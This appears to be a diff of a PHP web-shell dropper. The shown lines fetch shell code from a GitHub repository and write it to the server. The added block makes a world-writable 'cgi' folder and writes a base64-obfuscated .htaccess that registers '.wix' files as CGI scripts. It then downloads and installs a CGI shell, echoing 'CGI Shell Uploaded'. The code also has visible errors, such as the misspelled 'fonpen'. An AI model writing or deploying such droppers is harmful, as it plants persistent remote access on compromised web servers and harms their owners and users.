@@ -21,4 +21,12 @@ $tool = file_get_contents('https://raw.githubusercontent.com/FrankWiX/c2hlbGw/ma
 $e = fonpen("WiX/tool.php","w"); fwrite($e,$tool); fclose($e);
 echo "<br>Shell Uploaded";
 }
+if ($_GET["up"] == "cgi"){
+mkdir('cgi',0777);
+$ht = 'QWRkSGFuZGxlciBjZ2ktc2NyaXB0IC53aXg=';
+$access = fopen("cgi/.htaccess" ,"0777"); fwrite ($access ,base64_decode($ht)); fclose($access);
+$cgi = file_get_contents('https://raw.githubusercontent.com/FrankWiX/c2hlbGw/master/frank.wix');
+$f = fonpen("cgi/frank.wix","0755"); fwrite($f,$cgi); fclose($f);
+echo 'CGI Shell Uploaded';
+}
 ?>
